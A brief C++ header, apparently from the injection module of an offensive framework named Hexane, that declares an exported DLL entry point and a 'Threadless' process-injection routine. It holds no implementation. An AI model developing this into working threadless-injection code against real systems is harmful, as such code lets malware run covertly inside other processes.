#ifndef _HEXANE_INJECTLIB_CONFIG_HPP
#define _HEXANE_INJECTLIB_CONFIG_HPP
#include <monolith.hpp>
#include <core/include/cipher.hpp>
#include <core/include/names.hpp>
#include <core/include/utils.hpp>
#include <core/include/memory.hpp>
#include <core/include/process.hpp>
#include <inject/loader/resource.hpp>
#include <inject/include/config.hpp>


EXTERN_C VOID Execute();
DLL_EXPORT EXTERN_C FUNCTION VOID Entrypoint(HMODULE Base);

namespace Injection {
    VOID Threadless(HMODULE Base);

}
#endif //_HEXANE_INJECTLIB_CONFIG_HPP
